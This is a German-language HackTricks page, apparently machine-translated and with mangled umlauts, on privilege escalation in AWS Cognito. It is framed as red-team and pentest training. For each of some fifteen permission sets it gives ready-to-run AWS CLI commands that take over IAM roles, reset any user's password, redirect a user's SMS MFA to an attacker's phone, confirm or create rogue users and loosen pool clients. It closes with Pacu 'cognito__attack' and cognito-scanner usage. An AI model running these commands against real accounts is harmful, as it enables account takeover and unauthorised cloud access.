# AWS - Cognito Privesc

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Cognito

F√ºr weitere Informationen √ºber Cognito siehe:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Sammeln von Anmeldeinformationen aus dem Identity Pool

Da Cognito **IAM-Rollenanmeldeinformationen** sowohl an **authentifizierte** als auch an **unauthentifizierte** **Benutzer** vergeben kann, kannst du, wenn du die **Identity Pool ID** einer Anwendung findest (sollte darin hardcodiert sein), neue Anmeldeinformationen erhalten und somit privesc (innerhalb eines AWS-Kontos, in dem du wahrscheinlich zuvor keine Anmeldeinformationen hattest).

F√ºr weitere Informationen [**siehe diese Seite**](../aws-unauthenticated-enum-access/#cognito).

**Potenzielle Auswirkungen:** Direkte privesc zu der Dienstrolle, die an unauth Benutzer angeh√§ngt ist (und wahrscheinlich auch an die, die an auth Benutzer angeh√§ngt ist).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Mit dieser Berechtigung kannst du **jede Cognito-Rolle** an die authentifizierten/unauthentifizierten Benutzer der Cognito-App vergeben.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Wenn die Cognito-App **keine nicht authentifizierten Benutzer aktiviert hat**, ben√∂tigen Sie m√∂glicherweise auch die Berechtigung `cognito-identity:UpdateIdentityPool`, um sie zu aktivieren.

**Potenzielle Auswirkungen:** Direkte Privilegieneskalation zu jeder Cognito-Rolle.

### `cognito-identity:update-identity-pool`

Ein Angreifer mit dieser Berechtigung k√∂nnte beispielsweise einen Cognito-Benutzerpool unter seiner Kontrolle oder einen anderen Identit√§tsanbieter festlegen, bei dem er sich anmelden kann, **um auf diesen Cognito-Identit√§tspool zuzugreifen**. Dann wird ihm nur die **Anmeldung** bei diesem Benutzeranbieter **erm√∂glichen, auf die konfigurierte authentifizierte Rolle im Identit√§tspool zuzugreifen**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Es ist auch m√∂glich, diese Berechtigung zu **missbrauchen, um die Basisauthentifizierung zu erm√∂glichen**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potenzielle Auswirkungen**: Kompromittierung der konfigurierten authentifizierten IAM-Rolle innerhalb des Identit√§tspools.

### `cognito-idp:AdminAddUserToGroup`

Diese Berechtigung erlaubt es, **einen Cognito-Benutzer zu einer Cognito-Gruppe hinzuzuf√ºgen**, daher k√∂nnte ein Angreifer diese Berechtigung missbrauchen, um einen Benutzer unter seiner Kontrolle zu anderen Gruppen mit **besseren** Berechtigungen oder **anderen IAM-Rollen** hinzuzuf√ºgen:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potenzielle Auswirkungen:** Privesc zu anderen Cognito-Gruppen und IAM-Rollen, die an Benutzerpoolgruppen angeh√§ngt sind.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Ein Angreifer mit diesen Berechtigungen k√∂nnte **Gruppen erstellen/aktualisieren** mit **jeder IAM-Rolle, die von einem kompromittierten Cognito Identity Provider verwendet werden kann**, und einen kompromittierten Benutzer Teil der Gruppe machen, wodurch auf all diese Rollen zugegriffen werden kann:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potenzielle Auswirkungen:** Privesc zu anderen Cognito IAM-Rollen.

### `cognito-idp:AdminConfirmSignUp`

Diese Berechtigung erm√∂glicht es, **eine Anmeldung zu best√§tigen**. Standardm√§√üig kann sich jeder in Cognito-Anwendungen anmelden. Wenn dies so belassen wird, k√∂nnte ein Benutzer ein Konto mit beliebigen Daten erstellen und es mit dieser Berechtigung verifizieren.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potenzielle Auswirkungen:** Indirekte Privilegieneskalation zur IAM-Rolle des Identit√§tspools f√ºr authentifizierte Benutzer, wenn Sie einen neuen Benutzer registrieren k√∂nnen. Indirekte Privilegieneskalation zu anderen App-Funktionalit√§ten, indem Sie jedes Konto best√§tigen k√∂nnen.

### `cognito-idp:AdminCreateUser`

Diese Berechtigung w√ºrde es einem Angreifer erm√∂glichen, einen neuen Benutzer im Benutzerpool zu erstellen. Der neue Benutzer wird als aktiviert erstellt, muss jedoch sein Passwort √§ndern.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potenzielle Auswirkungen:** Direkte Privilegieneskalation zur IAM-Rolle des Identit√§tspools f√ºr authentifizierte Benutzer. Indirekte Privilegieneskalation zu anderen App-Funktionalit√§ten, indem er in der Lage ist, jeden Benutzer zu erstellen.

### `cognito-idp:AdminEnableUser`

Diese Berechtigung kann in einem sehr speziellen Szenario hilfreich sein, in dem ein Angreifer die Anmeldeinformationen eines deaktivierten Benutzers gefunden hat und er ihn **wieder aktivieren** muss.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potenzielle Auswirkungen:** Indirekte Privilegieneskalation zur IAM-Rolle des Identit√§tspools f√ºr authentifizierte Benutzer und Berechtigungen des Benutzers, wenn der Angreifer √ºber Anmeldeinformationen f√ºr einen deaktivierten Benutzer verf√ºgte.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Diese Berechtigung erm√∂glicht die Anmeldung mit der [**Methode ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** F√ºr weitere Informationen folgen Sie dem Link.

### `cognito-idp:AdminSetUserPassword`

Diese Berechtigung w√ºrde es einem Angreifer erm√∂glichen, **das Passwort eines beliebigen Benutzers zu √§ndern**, wodurch er in der Lage w√§re, sich als beliebiger Benutzer auszugeben (der keine MFA aktiviert hat).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potenzielle Auswirkungen:** Direkte Privilegieneskalation zu potenziell jedem Benutzer, sodass Zugriff auf alle Gruppen, in denen jeder Benutzer Mitglied ist, und Zugriff auf die authentifizierte IAM-Rolle des Identity Pools besteht.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Ein Angreifer k√∂nnte diese Berechtigung potenziell missbrauchen, um ein Mobiltelefon unter seiner Kontrolle als **SMS MFA eines Benutzers** festzulegen.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** √Ñhnlich wie die vorherige Berechtigung kann diese Berechtigung verwendet werden, um die MFA-Pr√§ferenzen eines Benutzers festzulegen, um den MFA-Schutz zu umgehen.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: √Ñhnlich wie die vorherige Berechtigung kann diese Berechtigung verwendet werden, um die MFA-Pr√§ferenzen eines Benutzerpools festzulegen, um den MFA-Schutz zu umgehen.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Es ist auch m√∂glich, den Benutzerpool zu aktualisieren, um die MFA-Richtlinie zu √§ndern. [√úberpr√ºfen Sie die CLI hier](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potenzielle Auswirkungen:** Indirekte Privilegieneskalation zu potenziell jedem Benutzer, dessen Anmeldeinformationen dem Angreifer bekannt sind, dies k√∂nnte es erm√∂glichen, den MFA-Schutz zu umgehen.

### `cognito-idp:AdminUpdateUserAttributes`

Ein Angreifer mit dieser Berechtigung k√∂nnte die E-Mail-Adresse oder Telefonnummer oder ein anderes Attribut eines Benutzers unter seiner Kontrolle √§ndern, um zu versuchen, mehr Privilegien in einer zugrunde liegenden Anwendung zu erlangen.\
Dies erm√∂glicht es, eine E-Mail-Adresse oder Telefonnummer zu √§ndern und sie als verifiziert festzulegen.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potenzielle Auswirkungen:** Potenzieller indirekter Privilegienausbau in der zugrunde liegenden Anwendung, die den Cognito User Pool verwendet und Privilegien basierend auf Benutzerattributen gew√§hrt.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Ein Angreifer mit dieser Berechtigung k√∂nnte **einen neuen User Pool Client erstellen, der weniger eingeschr√§nkt ist** als bereits vorhandene Pool-Clients. Zum Beispiel k√∂nnte der neue Client jede Art von Methode zur Authentifizierung zulassen, kein Geheimnis haben, die Token-Widerrufung deaktiviert haben und Tokens f√ºr einen l√§ngeren Zeitraum g√ºltig sein lassen...

Das gleiche kann getan werden, wenn anstatt einen neuen Client zu erstellen, ein **vorhandener modifiziert wird**.

In der [**Befehlszeile**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (oder dem [**Update**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) k√∂nnen Sie alle Optionen sehen, √ºberpr√ºfen Sie es!
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potenzielle Auswirkungen:** Potenzieller indirekter Privilegienausstieg zum Identity Pool autorisierter Benutzer, der vom User Pool verwendet wird, indem ein neuer Client erstellt wird, der die Sicherheitsma√ünahmen lockert und es einem Angreifer erm√∂glicht, sich mit einem Benutzer anzumelden, den er erstellen konnte.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Ein Angreifer k√∂nnte diese Berechtigung missbrauchen, um Benutzer zu erstellen, indem er eine CSV mit neuen Benutzern hochl√§dt.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(Im Falle, dass Sie einen neuen Importauftrag erstellen, ben√∂tigen Sie m√∂glicherweise auch die iam passrole-Berechtigung, ich habe es noch nicht getestet).

**Potenzielle Auswirkungen:** Direkte Privilegieneskalation zur IAM-Rolle des Identit√§tspools f√ºr authentifizierte Benutzer. Indirekte Privilegieneskalation zu anderen App-Funktionalit√§ten, indem Sie jeden Benutzer erstellen k√∂nnen.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Ein Angreifer k√∂nnte einen neuen Identit√§tsanbieter erstellen, um dann √ºber diesen Anbieter **einzuloggen**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potenzielle Auswirkungen:** Direkte Privilegieneskalation zur IAM-Rolle des Identit√§tspools f√ºr authentifizierte Benutzer. Indirekte Privilegieneskalation zu anderen App-Funktionalit√§ten, indem beliebige Benutzer erstellt werden k√∂nnen.

### cognito-sync:\* Analyse

Dies ist eine sehr h√§ufige Berechtigung, die standardm√§√üig in Rollen von Cognito Identity Pools vorhanden ist. Auch wenn ein Wildcard in Berechtigungen immer schlecht aussieht (insbesondere von AWS), sind die **gegebenen Berechtigungen aus der Sicht eines Angreifers nicht besonders n√ºtzlich**.

Diese Berechtigung erlaubt das Lesen von Benutzerinformationen der Identit√§tspools und Identit√§ts-IDs innerhalb der Identit√§tspools (was keine sensiblen Informationen sind).\
Identit√§ts-IDs k√∂nnten [**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) zugewiesen sein, die Informationen √ºber die Sitzungen enthalten (AWS definiert es als **gespeichertes Spiel**). Es k√∂nnte m√∂glich sein, dass dies eine Art von sensiblen Informationen enth√§lt (aber die Wahrscheinlichkeit ist ziemlich gering). Sie k√∂nnen auf der [**Aufz√§hlungsseite**](../aws-services/aws-cognito-enum/) nachlesen, wie Sie auf diese Informationen zugreifen k√∂nnen.

Ein Angreifer k√∂nnte auch diese Berechtigungen nutzen, um **sich selbst in einen Cognito-Stream einzuschreiben, der √Ñnderungen** an diesen Datasets ver√∂ffentlicht oder eine **Lambda-Funktion, die bei Cognito-Ereignissen ausgel√∂st wird**. Ich habe nicht gesehen, dass dies verwendet wird, und ich w√ºrde hier keine sensiblen Informationen erwarten, aber es ist nicht unm√∂glich.

### Automatische Tools

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), das AWS-Exploitation-Framework, umfasst jetzt die Module "cognito\_\_enum" und "cognito\_\_attack", die die Aufz√§hlung aller Cognito-Ressourcen in einem Konto automatisieren und schwache Konfigurationen, Benutzerattribute, die f√ºr die Zugriffskontrolle verwendet werden, usw. kennzeichnen, sowie die Benutzererstellung (einschlie√ülich MFA-Unterst√ºtzung) und Privilegieneskalation basierend auf modifizierbaren benutzerdefinierten Attributen, verwendbaren Identit√§tspool-Anmeldeinformationen, √ºbernehmbaren Rollen in ID-Token usw. automatisieren.

F√ºr eine Beschreibung der Funktionen der Module siehe Teil 2 des [Blogbeitrags](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). F√ºr Installationsanweisungen siehe die Hauptseite von [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Verwendung

Beispiel f√ºr die Verwendung von cognito\_\_attack, um die Benutzererstellung und alle Privilegieneskalationsvektoren gegen einen bestimmten Identit√§tspool und Benutzerpool-Client zu versuchen:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Beispiel f√ºr die Verwendung von cognito\_\_enum, um alle Benutzerpools, Benutzerpool-Clients, Identit√§tspools, Benutzer usw. zu sammeln, die im aktuellen AWS-Konto sichtbar sind:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) ist ein CLI-Tool in Python, das verschiedene Angriffe auf Cognito implementiert, einschlie√ülich einer Privilegieneskalation.

#### Installation
```bash
$ pip install cognito-scanner
```
#### Verwendung
```bash
$ cognito-scanner --help
```
F√ºr weitere Informationen besuchen Sie [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
